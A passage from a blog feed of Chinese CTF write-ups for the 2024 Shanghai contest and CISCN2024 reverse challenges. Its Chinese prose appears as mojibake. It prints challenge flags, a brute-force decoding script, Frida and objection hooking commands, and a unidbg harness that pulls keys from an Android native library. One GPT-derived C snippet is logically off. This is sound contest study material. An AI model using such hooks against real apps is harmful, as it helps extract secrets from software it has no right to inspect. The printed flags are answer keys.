class="code"><pre><code class="hljs autohotkey">flag&#123;This_is_<span class="hljs-built_in">a_beautiful</span>_day!&#125;<br></code></pre></td></tr></table></figure><h2 id="ez-login"><a href="#ez-login" class="headerlink" title="ez_login"></a>ez_login</h2><p>æ‰¾åˆ°deså’Œå¯†æ–‡</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716611130216-1f03c04c-be2b-48f5-aff0-d1ee6e354060.png" class="" title="img"><p>soå±‚å®ç°getKey</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716611157386-6330c5b7-07a3-4b8f-808c-e0a0d472c716.png" class="" title="img"><p>éœ€è¦hook key</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716611164735-73d017cd-67c7-4761-ad11-ed79b85700cb.png" class="" title="img"><p>frida-ps -U -aï¼Œç›´æ¥çœ‹çœŸæ­£çš„åŒ…åï¼Œæ³¨å…¥ä¹‹åå‘ç°keyå°±æ˜¯idaä¸­æ˜¾ç¤ºçš„ï¼Œæ€ªä¸å¾—èˆªç”µå¸ˆå‚…ç›´æ¥ååˆ†é’Ÿç§’äº†</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716611188300-47f9b13d-d19e-4215-abe1-00a1322ef702.png" class="" title="img"><p>ç›´æ¥å¤§å¨è§£å¯†</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716611103119-f3561930-dc64-4142-94e5-88037bfba2fe.png" class="" title="img"><h2 id="ez-iot-2"><a href="#ez-iot-2" class="headerlink" title="ez_iot-2"></a>ez_iot-2</h2><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716648938024-3fc4ac11-6fa2-4cb6-9b2f-79aaa1de8f7e.png" class="" title="img"><p>æƒ³ç€binè½¬hexï¼Œä½†hexæ— æ³•æŸ¥çœ‹</p><p>fileä¹‹åæœä¿¡æ¯å‘ç°æ˜¯åŸé¢˜</p><p><a href="https://blog.csdn.net/qq_40934487/article/details/90759362">https://blog.csdn.net/qq_40934487/article/details/90759362</a></p><p>æ— æ³•æ‰§è¡Œshï¼Œç”¨unsquashfsæå–åtmpç›®å½•æ— backdoor</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716693924453-bbffbb45-6463-4d49-850e-10a3e1bbb9d1.png" class="" title="img"><h1 id="æ•°æ®å®‰å…¨"><a href="#æ•°æ®å®‰å…¨" class="headerlink" title="æ•°æ®å®‰å…¨"></a>æ•°æ®å®‰å…¨</h1><h2 id="APIæ¥å£å®‰å…¨åˆ†æé¢˜"><a href="#APIæ¥å£å®‰å…¨åˆ†æé¢˜" class="headerlink" title="APIæ¥å£å®‰å…¨åˆ†æé¢˜"></a>APIæ¥å£å®‰å…¨åˆ†æé¢˜</h2><p><strong>1</strong></p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716631121962-2ed0573a-9843-43f9-900b-ee9d4569fdbf.png" class="" title="img"><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716623760405-856de68a-fd03-4aaa-a745-1824cd0ac50c.png" class="" title="img"><p><strong>2</strong></p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716631156880-e41daf4a-c947-41ca-9452-52d94ff72327.png" class="" title="img"><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716623780859-8db722e0-07b9-42ef-bcc6-7772b88223f6.png" class="" title="img"><h2 id="æ•°æ®å‹’ç´¢åˆ†æ"><a href="#æ•°æ®å‹’ç´¢åˆ†æ" class="headerlink" title="æ•°æ®å‹’ç´¢åˆ†æ"></a>æ•°æ®å‹’ç´¢åˆ†æ</h2><p><strong>1</strong></p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716631187178-1bbb5cbe-f085-469c-a67f-0f81452a03c7.png" class="" title="img"><p><strong>3</strong></p><p>idaåˆ†æå‘ç°å¯ä»¥ç›´æ¥ç”¨å®ƒçš„exeæ¥åŠ å¯†ï¼Œé‚£ä¹ˆå°±æƒ³åˆ°æˆ‘ä»¬å¯ä»¥è‡ªå·±å†™ä¸€ä¸ªæ–‡ä»¶æ¥çœ‹å®ƒæ€ä¹ˆåŠ å¯†çš„</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716642650348-c384c8ec-d328-4d16-ab54-9f130da31644.png" class="" title="img"><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716642659732-13404109-fabe-41bd-85a6-e98f2a0e2d7d.png" class="" title="img"><p>ç»è¿‡æ¯”å¯¹å‘ç°ï¼ŒåŠ å¯†åªæ˜¯å¼‚æˆ–äº†23</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716642705593-cb856394-1599-4853-849a-4b901c7886b7.png" class="" title="img"><p>æ‰€ä»¥ç›´æ¥å†™ä¸€ä¸ªè„šæœ¬æŠŠåŠ å¯†çš„æ–‡ä»¶æ¯ä¸ªå­—èŠ‚éƒ½å¼‚æˆ–23ï¼Œè§£å¯†åç›´æ¥æœ</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716630850175-6638fdb8-533f-4a40-91cd-7776a04fe8ce.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SMC</tag>
      
      <tag>frida</tag>
      
      <tag>å›ºä»¶é€†å‘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2024åˆèµ›Reverseéƒ¨åˆ†wp</title>
    <link href="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="asm-re"><a href="#asm-re" class="headerlink" title="asm_re"></a>asm_re</h2><p>txtæ‰¾åˆ°å¯†æ–‡</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1715998868105-63bb227a-4944-4769-b68a-22c270374e7b.png" class="" title="img"><p>æ‰¾åˆ°å…³é”®é€»è¾‘ï¼Œ*0x50 +0x14 ^0x4d +0x1eåé¢è¿˜æœ‰ä¸€æ®µ</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1715999113895-a0d46d70-9bab-4ad7-8511-727e1aadc28d.png" class="" title="img"><p>ä¹Ÿå¯ä»¥é—®ä¸€ä¸‹gptå¾—åˆ°æµç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">char</span> src[] = <span class="hljs-string">&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;</span>;<br>    <span class="hljs-type">char</span> dst[<span class="hljs-number">0x98</span>];<br>    <span class="hljs-type">char</span> result[<span class="hljs-number">0x50</span>];<br><br>    <span class="hljs-built_in">memcpy</span>(dst, src, <span class="hljs-number">0x98</span>);<br><br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(dst);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        result[i] = ((dst[i] * <span class="hljs-number">0x50</span>) + <span class="hljs-number">0x14</span>) ^ <span class="hljs-number">0x4D</span> + <span class="hljs-number">0x1E</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (len &gt;= <span class="hljs-number">0x50</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The result array matches the expected array.\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The result array does not match the expected array.\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›´æ¥é™¤å»å¯†æ–‡ç„¶åçˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python">numbers = [<br>    <span class="hljs-number">0x1FD7</span>,<br>    <span class="hljs-number">0x21B7</span>,<br>    <span class="hljs-number">0x1E47</span>,<br>    <span class="hljs-number">0x2027</span>,<br>    <span class="hljs-number">0x26E7</span>,<br>    <span class="hljs-number">0x10D7</span>,<br>    <span class="hljs-number">0x1127</span>,<br>    <span class="hljs-number">0x2007</span>,<br>    <span class="hljs-number">0x11C7</span>,<br>    <span class="hljs-number">0x1E47</span>,<br>    <span class="hljs-number">0x1017</span>,<br>    <span class="hljs-number">0x1017</span>,<br>    <span class="hljs-number">0x11F7</span>,<br>    <span class="hljs-number">0x2007</span>,<br>    <span class="hljs-number">0x1037</span>,<br>    <span class="hljs-number">0x1107</span>,<br>    <span class="hljs-number">0x1F17</span>,<br>    <span class="hljs-number">0x10D7</span>,<br>    <span class="hljs-number">0x1017</span>,<br>    <span class="hljs-number">0x1017</span>,<br>    <span class="hljs-number">0x1F67</span>,<br>    <span class="hljs-number">0x1017</span>,<br>    <span class="hljs-number">0x11C7</span>,<br>    <span class="hljs-number">0x11C7</span>,<br>    <span class="hljs-number">0x1017</span>,<br>    <span class="hljs-number">0x1FD7</span>,<br>    <span class="hljs-number">0x1F17</span>,<br>    <span class="hljs-number">0x1107</span>,<br>    <span class="hljs-number">0xF47</span>,<br>    <span class="hljs-number">0x1127</span>,<br>    <span class="hljs-number">0x1037</span>,<br>    <span class="hljs-number">0x1E47</span>,<br>    <span class="hljs-number">0x1037</span>,<br>    <span class="hljs-number">0x1FD7</span>,<br>    <span class="hljs-number">0x1107</span>,<br>    <span class="hljs-number">0x1FD7</span>,<br>    <span class="hljs-number">0x1107</span>,<br>    <span class="hljs-number">0x2787</span><br>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(numbers))<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>((numbers))):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        tmp=(((j*<span class="hljs-number">0x50</span>)+<span class="hljs-number">0x14</span>)^<span class="hljs-number">0x4d</span>)+<span class="hljs-number">0x1e</span><br>        <span class="hljs-keyword">if</span> tmp==numbers[i]:<br>            <span class="hljs-comment">#print(tmp)</span><br>            flag+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(flag)<br>flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;<br></code></pre></td></tr></table></figure><h2 id="androidso-re-1"><a href="#androidso-re-1" class="headerlink" title="androidso_re-1"></a>androidso_re-1</h2><h3 id="æ³•1"><a href="#æ³•1" class="headerlink" title="æ³•1"></a>æ³•1</h3><p>å·²çŸ¥flagæ ¼å¼å’Œå†…éƒ¨32ä½</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716008811065-93fe4d2d-0a13-4640-ab30-a1b78514b6a4.png" class="" title="img"><p>å…ˆdeså†base64</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716008921989-1dd736d6-bf3e-4a4d-bd71-84fe1edf4d41.png" class="" title="img"><p>soå±‚ä¸¤ä¸ªå‡½æ•°å°è¯•hookè¿”å›å€¼</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716009009106-ebf99371-5b90-49d1-a4f4-83d114c70fc5.png" class="" title="img"><p>å¾ˆå¥‡æ€ªç«Ÿç„¶æŠ¥é”™äº†</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716009065340-e54d7dfa-cc58-407a-932e-18932a5fd750.png" class="" title="img"><p>ç”¨è„šæœ¬ä¸€ç›´æ— æ³•hookï¼Œç”¨objectionå¯ä»¥æ³¨å…¥ objection -g com.example.re11113 explore</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716727329496-5d0f0184-42ce-4529-af78-0c798d5663a7.png" class="" title="img"><p>android hooking watch class_method com.example.re11113.jni.getiv â€“dump-args â€“dump-return â€“dump-backtrace</p><p>è¾“å…¥æ ¼å¼å’Œé•¿åº¦ç›¸åŒçš„flagï¼šflag{12345678901234567890123456789012}</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1755447942816-6f0c7188-1c3e-4c5c-8c50-af258c5e08a8.png" class="" title="img"><p>ä¸€æ¬¡åªèƒ½æ³¨å…¥ä¸€ä¸ªï¼Œå¾—åˆ°ç»“æœåè¦æ–°å¼€cmd</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716727671141-8b4694be-f3b1-4830-bd93-baa0fe5a1082.png" class="" title="img"><p>åé¢ç›´æ¥è§£å¯†</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716728078106-1d93d6d1-1dc6-48bc-80f3-3c44e505a1fe.png" class="" title="img"><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag&#123;<span class="hljs-number">188</span>cba<span class="hljs-number">3</span>a<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>fbb<span class="hljs-number">2250</span>b<span class="hljs-number">5</span>a<span class="hljs-number">2e590</span><span class="hljs-keyword">c</span><span class="hljs-number">391</span>ce&#125;<br></code></pre></td></tr></table></figure><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1755446498758-92cc142d-d65d-42e2-8318-ccaf569a8bc2.png" class="" title="img"><p>ä¸Šé¢çš„å›¾è¯´æ˜fridaçš„æ—¶å€™ä¼šè¯»åˆ°éutf-8çš„å­—ç¬¦</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hook</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> jni = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.re11113.jni&quot;</span>);<br>    <span class="hljs-keyword">var</span> iv = jni.<span class="hljs-title function_">getiv</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;IV: &quot;</span>+iv);<br>    <span class="hljs-keyword">var</span> getKeyBase = <span class="hljs-title class_">Module</span>.<span class="hljs-title function_">findExportByName</span>(<span class="hljs-string">&quot;libSecret_entrance.so&quot;</span>, <span class="hljs-string">&quot;Java_com_example_re11113_jni_getkey&quot;</span>);<br> <br>    <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(getKeyBase, &#123;<br>        <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br>        &#125;,<br>        <span class="hljs-attr">onLeave</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) &#123;<br>        &#125;<br>    &#125;);<br>    <span class="hljs-keyword">var</span> key = jni.<span class="hljs-title function_">getKey</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Key: &quot;</span> + key);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ³•2"><a href="#æ³•2" class="headerlink" title="æ³•2"></a>æ³•2</h3><p>å¤§éƒ¨åˆ†å¸ˆå‚…ç›´æ¥é€†ä»£ç </p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716735131352-219b2d8e-7ee6-4e2a-8d26-ef1a84d8f1a6.png" class="" title="img"><p>ä¸Šé¢æœåˆ°base64ï¼ŒçŒœæµ‹å‡¯æ’’åç§»</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716735116214-b7f37c9b-877b-46c6-81f2-e4b20eae3f6a.png" class="" title="img"><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716735171955-1fcd7cb3-19e5-419d-a487-61fb1c633d12.png" class="" title="img"><p>rc4è§£å¯†ä¹‹åå†å¼‚æˆ–ä¹Ÿè¡Œ</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716735266503-cc6fa2e4-e618-47e0-b236-e19a8bba8d57.png" class="" title="img"><p>åªå–å‰å…«ä½</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1716735300132-1f7adebd-bb08-4e89-8c88-d147c6c08ce3.png" class="" title="img"><h3 id="æ³•3"><a href="#æ³•3" class="headerlink" title="æ³•3"></a>æ³•3</h3><p><a href="https://blog.csdn.net/Pisces50002/article/details/139580143">https://blog.csdn.net/Pisces50002/article/details/139580143</a></p><p>å®‰è£…r0envé›†æˆç¯å¢ƒï¼š<a href="https://pan.baidu.com/share/init?surl=y6ceiOzWuv0Gl5FNksgciQ">https://pan.baidu.com/share/init?surl=y6ceiOzWuv0Gl5FNksgciQ</a> æå–ç ï¼šv8at</p><p>æŠŠsoå’Œapkæ–‡ä»¶æ”¾åˆ°javaæ–‡ä»¶å¤¹ä¸‹</p><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719932092152-cad9c42a-587c-415f-bfa0-ced80890e8c8.png" class="" title="img"><img src="/2024/05/21/CISCN2024%E5%88%9D%E8%B5%9BReverse%E9%83%A8%E5%88%86wp/1719932292840-3c6011cc-cd99-434c-8eff-ba5884dc4eb7.png" class="" title="img"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.ciscn;<br><br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.AndroidEmulatorBuilder;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.AndroidResolver;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.AbstractJni;<br><span class="hljs-keyword">import</span> com.github.unidbg.AndroidEmulator;<br><span class="hljs-keyword">import</span> com.github.unidbg.Module;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.*;<br><span class="hljs-keyword">import</span> com.github.unidbg.memory.Memory;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.DalvikModule;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.DvmClass;<br><span class="hljs-keyword">import</span> com.github.unidbg.linux.android.dvm.VM;<br><br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ciscna</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractJni</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AndroidEmulator emulator; <span class="hljs-comment">//android æ¨¡æ‹Ÿå™¨ a</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> VM vm;<span class="hljs-comment">//vm è™šæ‹Ÿæœº</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Module <span class="hljs-keyword">module</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Memory memory;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DalvikModule dm;<br><br>    <span class="hljs-comment">//å°†è¯¥ç±»å°è£…èµ·æ¥ï¼Œä»¥åç›´æ¥å¥—ç”¨æ¨¡æ¿</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ciscna</span><span class="hljs-params">(String apkFilePath, String soFilePath, String apkProcessname)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// åˆ›å»ºæ¨¡æ‹Ÿå™¨å®ä¾‹,è¿›ç¨‹åå»ºè®®ä¾ç…§å®é™…è¿›ç¨‹åå¡«å†™ï¼Œå¯ä»¥è§„é¿é’ˆå¯¹è¿›ç¨‹åçš„æ ¡éªŒ</span><br>        emulator = AndroidEmulatorBuilder.for64Bit().setProcessName(apkProcessname).build();<br>        memory = emulator.getMemory();<br>        memory.setLibraryResolver(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AndroidResolver</span>(<span class="hljs-number">23</span>));<br>        vm = emulator.createDalvikVM(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(apkFilePath));<br>        vm.setVerbose(<span class="hljs-literal">false</span>); <span class="hljs-comment">// æ‰“å°æ—¥å¿—ï¼Œä¼šåœ¨è°ƒç”¨åˆå§‹åŒ– JNI_unload æ‰“å°ä¸€äº›ä¿¡æ¯ï¼Œé»˜è®¤ï¼šfalse</span><br>        <span class="hljs-comment">// åŠ è½½ç›®æ ‡ SO</span><br>        dm = vm.loadLibrary(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(soFilePath), <span class="hljs-literal">true</span>); <span class="hljs-comment">// åŠ è½½ so åˆ°è™šæ‹Ÿå†…å­˜ï¼Œç¬¬äºŒä¸ªå‚æ•°ï¼šæ˜¯å¦éœ€è¦åˆå§‹åŒ–</span><br>        <span class="hljs-comment">//è·å–æœ¬ SO æ¨¡å—çš„å¥æŸ„</span><br>        <span class="hljs-keyword">module</span> = dm.getModule();<br>        vm.setJni(<span class="hljs-built_in">this</span>); <span class="hljs-comment">//è®¾ç½® Jniï¼Œé˜²æ­¢æŠ¥é”™</span><br>        <span class="hljs-comment">//åˆ›å»ºå®Œåï¼Œéœ€è¦è°ƒç”¨ JNI_onload å‡½æ•°</span><br>        dm.callJNI_OnLoad(emulator); <span class="hljs-comment">// è°ƒç”¨ JNI OnLoadï¼Œè¿›è¡ŒåŠ¨æ€æ³¨å†ŒæŸäº›å‡½æ•°ã€‚å¦‚æœéƒ½æ˜¯é™æ€æ³¨å†Œï¼Œé‚£å°±ä¸ç”¨è°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br>        vm.setVerbose(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// Debugger debugger = emulator.attach();</span><br>        <span class="hljs-comment">// debugger.addBreakPoint(module.base + 0x1924C);</span><br>        <span class="hljs-comment">// debugger.addBreakPoint(module.base + 0x19240);</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ciscna</span><span class="hljs-params">(AndroidEmulator emulator, VM vm, Module <span class="hljs-keyword">module</span>, Memory memory, DalvikModule dm)</span> &#123;<br>        <span class="hljs-built_in">this</span>.emulator = emulator;<br>        <span class="hljs-built_in">this</span>.vm = vm;<br>        <span class="hljs-built_in">this</span>.<span class="hljs-keyword">module</span> = <span class="hljs-keyword">module</span>;<br>        <span class="hljs-built_in">this</span>.memory = memory;<br>        <span class="hljs-built_in">this</span>.dm = dm;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">func_getKey</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">DvmClass</span> <span class="hljs-variable">dvmClass</span> <span class="hljs-operator">=</span> vm.resolveClass(<span class="hljs-string">&quot;com.example.re11113.jni&quot;</span>);<br>        DvmObject&lt;?&gt; object = dvmClass.newObject(<span class="hljs-literal">null</span>);<br>        DvmObject&lt;?&gt; object1 = object.callJniMethodObject(emulator, <span class="hljs-string">&quot;getkey()Ljava/lang/String;&quot;</span>);<br>        <span 